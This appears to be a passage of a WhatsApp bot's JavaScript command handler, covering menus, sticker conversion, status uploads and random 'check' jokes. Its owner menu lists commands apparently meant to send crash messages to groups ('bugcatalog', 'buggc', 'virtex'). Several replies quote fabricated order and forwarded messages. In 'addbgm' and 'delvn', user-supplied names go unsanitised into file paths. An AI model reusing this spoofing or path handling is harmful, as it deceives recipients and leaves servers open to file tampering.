                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(err)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									 xeon.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    }
                    }
                    break
              case 'dice':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			xeon.sendMessage(from, damdu, sticker, {quoted: mek})
			break
 case 'owner3':
let ini_list = []
for (let i of nomorowner1) {
const vname = xeon.contacts[i] != undefined ? xeon.contacts[i].vname || xeon.contacts[i].notify : undefined
ini_list.push({
"displayName": 'jack',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${xeon.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await xeon.sendMessage(from, {
"displayName": `${ini_list.length} contact`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
xeon.sendMessage(from,'This is my owners contact',text,{quoted: mek})
break
case 'command':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 listMsg = {
 buttonText: '𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨',
 footerText: '𝙿𝙴𝙿𝙴 𝚂𝙸𝚁',
 description: `Hi @${sender.split('@')[0]}, Please select the menu here`,
 sections: [
                     {
                      "title": `ᴘᴇᴘᴇ`,
 rows: [
                          {
                              "title": "Script",
                              "rowId": ""
                           },
                           {
                              "title": "Speed",
                              "rowId": ""
                           },
                           {
                              "title": "Status",
                              "rowId": ""
                           },
                           {
                              "title": "Creator",
                              "rowId": ""
                           },
                           {
                              "title": "Group",
                              "rowId": ""                              
                           },
                           {
                              "title": "Rules",
                              "rowId": ""
                           },
                           {
                              "title": "Runtime",
                              "rowId": ""
                           },
                           {
                              "title": "OwnerMenu",
                              "rowId": ""
                           },
                           {
                              "title": "MakerMenu",
                              "rowId": ""
                           },
                           {
                              "title": "GroupMenu",
                              "rowId": ""
                           },
                           {
                              "title": "OtherMenu",
                              "rowId": ""
                           },
                           {
                              "title": "DownloadMenu",
                              "rowId": "d"
                           },
                           {
                              "title": "UpswMenu",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
xeon.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:ftrol})
break
case 'group':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 listMsgg = {
 buttonText: 'CLICK HERE',
 footerText: '𝙿𝙴𝙿𝙴 𝚂𝙸𝚁',
 description: `OPEN OR CLOSE GROUP`,
 sections: [
                     {
                      "title": `ᴘᴇᴘᴇ`,
 rows: [
                          {
                              "title": "opengroup",
                              "rowId": ""
                           },
                           {
                              "title": "closegroup",
                              "rowId": ""
                           },   
                           {
                              "title": "revokelink",
                              "rowId": ""                              
                           }
                        ]
                     }],
 listType: 1
}
xeon.sendMessage(from, listMsgg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:ftrol})
break
case 'downloadmenu':
menu = `︎𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥𝘦𝘳 𝘔𝘦𝘯𝘶
❑${prefix}𝙮𝙩𝙢𝙥4 𝙡𝙞𝙣𝙠

❑${prefix}𝙮𝙩𝙢𝙥3 𝙡𝙞𝙣𝙠

❑${prefix}𝙥𝙡𝙖𝙮 𝙦𝙪𝙚𝙧𝙮

❑${prefix}𝙞𝙣𝙨𝙩𝙖𝙜𝙧𝙖𝙢 <𝙪𝙧𝙡>

❑${prefix}𝙩𝙬𝙞𝙩𝙩𝙚𝙧 <𝙪𝙧𝙡>
`
sendButMessage(from, menu, `𝙿𝙴𝙿𝙴 𝚂𝙸𝚁`, [
          {
            buttonId: `command`,
            buttonText: {
              displayText: `𝘽𝙖𝙘𝙠 𝙈𝙚𝙣𝙪 ︎`,
            },
            type: 1,
          },]);
break
case 'groupmenu':
menu = `𝘎𝘳𝘰𝘶𝘱 𝘔𝘦𝘯𝘶︎︎
❑${prefix}group [3 Button]

❑${prefix}promote <reply chat member>

❑${prefix}demote <reply chat member>

❑${prefix}setdesc

❑${prefix}nsfw 1/0

❑${prefix}setname

❑${prefix}kick <reply/tag member>

❑${prefix}add <reply/tag member>

❑${prefix}getbio <reply chat member>

❑${prefix}getname <reply chat member>

❑${prefix}reminder <msg/2s>

❑${prefix}listonline

❑${prefix}sider [reply chat bot]

❑${prefix}antilink

❑${prefix}tod 

❑${prefix}tospam amount

❑${prefix}antihidetag

❑${prefix}autojoin

❑${prefix}antivirtex

❑${prefix}kickarea
`
sendButMessage(from, menu, ` 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁`, [
          {
            buttonId: `command`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'ownermenu':
menu = `𝘖𝘸𝘯𝘦𝘳 𝘔𝘦𝘯𝘶
❑${prefix}off

❑${prefix}isbaileys

❑${prefix}banchat

❑${prefix}unbanchat

❑${prefix}listbc

❑${prefix}antidelete on|off

❑${prefix}autotype on| off

❑${prefix}autoread gc on / gc off

❑${prefix}autovn on / off

❑${prefix}anticall on | off

❑${prefix}getcaption

❑${prefix}bugcatalog

❑${prefix}buggc [id grup]

❑${prefix}okvirtex

❑${prefix}on

❑${prefix}status

❑${prefix}setthumb

❑${prefix}settarget

❑${prefix}setfakeimg

❑${prefix}setreply

❑${prefix}hacked

❑${prefix}setprefix

❑${prefix}mode [2 Button self/public]

❑${prefix}term <code>

❑${prefix}eval <code>

❑${prefix}colongsw [reply sw]
`
sendButMessage(from, menu, `𝙿𝙴𝙿𝙴 𝚂𝙸𝚁`, [
          {
            buttonId: `command`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'upswmenu':
menu = `シ︎𝘜𝘱𝘴𝘸 𝘔𝘦𝘯𝘶シ︎
❑${prefix}upswteks teks

❑${prefix}upswvideo

❑${prefix}upswimage

❑${prefix}upswvoice

❑${prefix}upswsticker

❑${prefix}upswlocation
`
sendButMessage(from, menu, ` 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁`, [
          {
            buttonId: `command`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'othermenu':
menu = `𝘖𝘵𝘩𝘦𝘳 𝘔𝘦𝘯𝘶
❑${prefix}ping

❑${prefix}alive

❑${prefix}inspect

❑${prefix}join

❑${prefix}dice

❑${prefix}numbers [number]

❑${prefix}quote

❑${prefix}write text

❑${prefix}writeleft text

❑${prefix}folioleft text

❑${prefix}folioright text

❑${prefix}ss link web

❑${prefix}songlyrics <query>

❑${prefix}namemeaning <name>

❑${prefix}debug

❑${prefix}loli 

❑${prefix}debug2

❑${prefix}infoearthquake

❑${prefix}recipes

❑${prefix}chat 91|P

❑${prefix}searchmessage <query>

❑${prefix}get url

❑${prefix}githubstalk <query>

❑${prefix}ytsearch <query>

❑${prefix}igstalk <query>

❑${prefix}tiktokstalk <query>

❑${prefix}play <query>

❑${prefix}video <query>

❑${prefix}igstory <username>

❑${prefix}twitter <link>

❑${prefix}tiktok <link>

❑${prefix}fb <link>

❑${prefix}image <query>

❑${prefix}anime <random>

❑${prefix}pinterest <query>

❑${prefix}comic <query>

❑${prefix}lyrics <query>

❑${prefix}chara <query>

❑${prefix}playstore <query>
`
sendButMessage(from, menu, ` 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁`, [
          {
            buttonId: `command`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'makermenu':
menu = `𝘔𝘢𝘬𝘦𝘳 𝘔𝘦𝘯𝘶
❑${prefix}𝙨𝙩𝙞𝙘𝙠𝙚𝙧

❑${prefix}𝙨𝙬𝙢 <𝙖𝙪𝙩𝙝𝙤𝙧|𝙥𝙖𝙘𝙠𝙣𝙖𝙢𝙚>

❑${prefix}𝙩𝙖𝙠𝙚 <𝙖𝙪𝙩𝙝𝙤𝙧|𝙥𝙖𝙘𝙠𝙣𝙖𝙢𝙚>

❑${prefix}fdeface

❑${prefix}attp text

❑${prefix}emoji

❑${prefix}golden text

❑${prefix}flower text

❑${prefix}wooden text

❑${prefix}burn text

❑${prefix}glow text

❑${prefix}summer text

❑${prefix}neon text

❑${prefix}coffeecup2 text

❑${prefix}coffeecup text

❑${prefix}battlefield text|text

❑${prefix}googletxt2 text|text

❑${prefix}transformer text|text

❑${prefix}write text

❑${prefix}waifu
`
sendButMessage(from, menu, ` 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁`, [
          {
            buttonId: `command`,
            buttonText: {
              displayText: `⬡ BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'catalog':
      list = await xeon.prepareMessageFromContent(from, {
    "listMessage": {
      "title": "PAYMENT",
      "description": "CLICK",
      "buttonText": "",
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST CATALOG",
            "products": [
              {
                "productId": "4120139628109348"
              },
              {
              	"productId": "6431678466857362"
              },
              {
              	"productId": "4392524570816732"
              }
            ]
          }
        ],
        "headerImage": {
          "productId": "4120139628109348",
          "jpegThumbnail": iye
        },
        "businessOwnerJid": sender
      },
      "footerText": " 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁"
    }
  }, {quoted: freply})
  xeon.relayWAMessage(list, {waitForAck: true})
       
case 'triggered':
                
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    let media = await xeon.downloadAndSaveMediaMessage(encmedia)
                    var tolink = await uptotele(media)
                let ane = await getBuffer(`https://some-random-api.ml/canvas/triggered?avatar=${tolink}`)
                fs.writeFileSync('./sticker/triggered.webp', ane)
                exec(`webpmux -set exif ./sticker/data.exif ./sticker/triggered.webp -o ./sticker/triggered.webp`, async (error) => {
                    if (error) return reply(mess.error.api)
                    xeon.sendMessage(from, fs.readFileSync(`./sticker/triggered.webp`), sticker, {quoted: freply})
                    
                    fs.unlinkSync(`./sticker/triggered.webp`)	
                })
                }
            
                break
  break
case 'git':
case 'script':
		case 'sc':
		case 'sourcecode':
		xeon.sendMessage(from, { text: "╭─➤ *ᴘᴇᴘᴇ sɪʀ*\n│       ❑  *sᴄʀɪᴘᴛ*\n│❖   ɢɪᴛʜᴜʙ:\n│❖   https://github.com/jacksir/jack-SIR\n│❖   ʏᴏᴜᴛᴜʙᴇ:\n│❖   https://youtube.com/channel/UCVJ9029PQ-gJBtFQZZ3AJuA\n│❖   ᴡᴀᴛsᴀᴘᴘ ɢʀᴏᴜᴘ:\n╰────────────────❋ཻུ۪۪⸙\n\n⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘\n             ᴘᴇᴘᴇ sɪʀ\n\n╭◪ *ᴄᴏᴅᴅᴇᴅ ʙʏ ᴘᴇᴘᴇ*\n╰─────────────────❋ཻུ۪۪⸙", matchedText: 'nopee', description: "", title: "What are you doing?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
        if (isQuotedSticker) {
          if (!q)
            return reply(`Usage : ${command} cmd and tag sticker`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          fakestatus("Done!");
        } else {
          reply("the sticker tag");
        }
        break;
	case 'upswtxt':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
if (args.length < 1) return reply('The text?')
                    teks = body.slice(10)
                    xeon.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Successful upload status:\n${teks}`)
                    break	
                    case 'upswlocation':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
  if (args.length < 1) return reply('The text?')
                    teks = body.slice(12)
                    xeon.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${fakeyoi}`}, MessageType.location)
                    reply(`Location upload success:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
if (!isQuotedSticker) return reply('Reply the sticker!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await xeon.downloadMediaMessage(encmedia)
						xeon.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Successfully uploading stickers`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await xeon.downloadMediaMessage(encmedia)
						xeon.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Audio upload success`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
if (!isQuotedAudio) return reply('Reply audio!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await xeon.downloadMediaMessage(encmedia)
						xeon.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Voice upload success`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await xeon.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    xeon.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Successful video upload:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xeon.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    xeon.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Gif upload success:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xeon.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    xeon.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Image upload success:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return reply('Only owner can use this feature')
				return xeon.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
      case "delcmd":
        if (!isQuotedSticker)
          return reply(`Usage : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        fakestatus("Done!");
        break;
      case "listcmd":
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
        // banchat fixed by jack
case 'banchat':
if (!isGroup) return reply('this feature is only for groups')
if (!itsMe && !isOwner && !isGroupAdmins)return mentions(`*This Order is Specially for owner @${ownerN} !*`, [`${ownerN}@s.whatsapp.net`], true)
//if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isBanchat) return reply(`already banned`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Successful bot Ban on this group`)
break

case 'unbanchat':
if (!itsMe && !isOwner)return reply('Only owner can use this feature')
if (!isBanchat) return reply(`Already at UnBan`)
let ubc = bancht.indexOf(from)
bancht.splice(ubc, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`The bot has been unbanned in this group`)
break

case 'listbanchat': case 'listbc':
 teks = `*List Banchat Group!*\n_Total : ${bancht.length}_\n\n`
for(let i of bancht){
met = await xeon.groupMetadata(i)
teks += 'Id : ' + i + '\n'
teks += 'Nama Group : ' + met.subject + '\n\n'
}
reply(teks)
break
// ml hero 
case 'herodetail':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Name* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Hero Features* : ${res.hero_feature}
*Special* : ${res.speciality}
*Recommended Lane* : ${res.laning_recommendation}
*Price* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Release* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
case 'herolist':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
await herolist().then((ress) => {
let listt = `*List of heroes for features ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
//fun features by jack
                case 'uglycheck':
					// source code by jack⛔
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                  sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					xeon.sendMessage(from, 'Question : *'+sange+'*\n\nAnswer: '+ nge+'%', text, { quoted: mek })
					break
                case 'gaycheck':
					// source code by jack⛔
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                  gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					xeon.sendMessage(from, 'Question : *'+gayy+'*\n\nAnswer : '+ yag+'%', text, { quoted: mek })
					break
                case 'lesbicheck':
					// source code by jack⛔
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                  lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
					xeon.sendMessage(from, 'Question : *'+lesbii+'*\n\nAnswer : '+ bi+'%', text, { quoted: mek })
					break
                case 'handsomecheck':
					// source code by jack⛔
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					xeon.sendMessage(from, 'Question : *'+ganteng+'*\n\nAnswer : '+ teng+'%', text, { quoted: mek })
					break
		case 'beautycheck':
					// source code by jack⛔
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					xeon.sendMessage(from, 'Question : *'+cantik+'*\n\nAnswer : '+ tik+'%', text, { quoted: mek })
					break
		case 'character':
					// source code by jack⛔
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
watak = body.slice(1)
					const wa =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					xeon.sendMessage(from, 'Question : *'+watak+'*\n\nAnswer : '+ tak, text, { quoted: mek })
				        break
                case 'can':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
					bisakah = body.slice(1)
					const bisa =['Can', 'Cant', 'Try again','Are you dreaming?','Are you sure you can?']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					xeon.sendMessage(from, 'Question : *'+bisakah+'*\n\nAnswer : '+ keh, text, { quoted: mek })
					break
				case 'when':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
					kapankah = body.slice(1)
					const kapan =['Tomorrow','The day after tomorrow','Earlier','4 Days','5 Days','6 Days','1 Week Again','2 Weeks Again','3 Weeks Again','1 Month Again','2 Months','3 Months','4 Months','5 Months','6 Months Again']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					xeon.sendMessage(from, 'Question : *'+kapankah+'*\n\nAnswer : '+ koh, text, { quoted: mek })
					break
         			  case 'is':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
					apakah = body.slice(1)
					const apa =['Yes','No','Could be','I dont know lmao','Ask the Chicken']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					xeon.sendMessage(from, 'Question : *'+apakah+'*\n\nAnswer : '+ kah, text, { quoted: mek })
					break
				case 'rate':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
					rate = body.slice(1)
					const ra =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					xeon.sendMessage(from, 'Question : *'+rate+'*\n\nAnswer : '+ te+'%', text, { quoted: mek })
					break
					//fun features end here
					//tagall feature
					case 'tagall':
					if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
					if (!isGroup) return reply('this feature is only for groups')
					if (!isGroupAdmins) return reply('only admin can use this feature')
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `🦄 @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
					//feature by jack
					          case 'phcomment':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack&lol*`)
                   var F = body.slice(10)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/phub?apikey=${zeksApikey}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
                  xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nhow is it?`, quoted: mek})
                   break
                           case 'wolf':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack*`)
                   F = body.slice(6)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/wolflogo?apikey=${zeksApikey}&text1=zeeoneofc&text2=${F}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it?`, quoted: mek})
                   break
         case 'tfire':  
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack*`)
                   F = body.slice(7)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/tfire?text=${F}&apikey=${zeksApikey}`)                   
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break             
       case 'ytgol':  
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack*`)
                   F = body.slice(8)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'ytsilver':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} jack*`)
                   F = body.slice(10)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
                   xeon.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
      case 'addvn':
      case 'addbgm':
					if (!isQuotedAudio) return reply('*Reply to Audio*')
					nm = body.slice(7)
					if (!nm) return reply('*What is The bgm name?*')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await xeon.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./sticker/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					xeon.sendMessage(from, `*Bgm Added*`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {})}, message: { orderMessage: { itemCount: 333, status: 200, thumbnail: fs.readFileSync('./xeon.jpg'), surface: 200, message: `${nm}`, orderTitle: 'jack', sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
					break
	 case 'delvn':
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./sticker/${nmm}.mp3`)
